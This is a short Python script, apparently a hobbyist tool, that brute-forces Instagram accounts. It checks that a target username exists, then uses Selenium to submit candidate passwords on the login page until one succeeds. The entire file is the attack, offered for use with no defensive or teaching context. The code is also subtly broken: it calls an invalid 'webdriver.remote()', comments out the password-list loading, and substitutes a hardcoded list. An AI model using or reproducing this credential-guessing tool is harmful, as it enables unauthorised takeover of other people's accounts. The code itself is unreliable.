import requests
from selenium import webdriver

Done = False


def main():
    global Done, password
    while True:
        username = input("Enter username of target : ")
        response = requests.get("https://www.instagram.com/%s/?__a=1" % username).text
        if response == "{}":
            print("Username invalid, try again...")
        else:
            break
    while True:
        passlist_path = input("Enter password list name (or skip and default one will be used) : ")
        if passlist_path == "":
            passlist_path = "passlist.txt"
            break
        else:
            try:
                passlist = open(passlist_path, "r")
                passlist.close()
                break
            except FileNotFoundError:
                print("password list doesn\'t exist, try again...")
#    with open(passlist_path, "r") as f:
#         passwords = f.read().split("\n")
    passwords = ["djsjjanuue", "kanevuz82762", "258153@#$pdrm", "kekmevjsjh", "kekmevjsjh"]
    for password in passwords:
        driver = webdriver.remote()
        driver.get('https://www.instagram.com/accounts/login/')
        username_field = driver.find_element_by_name("username")
        password_field = driver.find_element_by_name("password")
        login_button = driver.find_element_by_name("submit")
        username_field.clear()
        password_field.clear()
        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()
        if 'logged-in' in driver.page_source:
            Done = True
            break
print("sh")
main()
if Done:
    print("Password found : %s" % password)
else:
    print("Password not found")
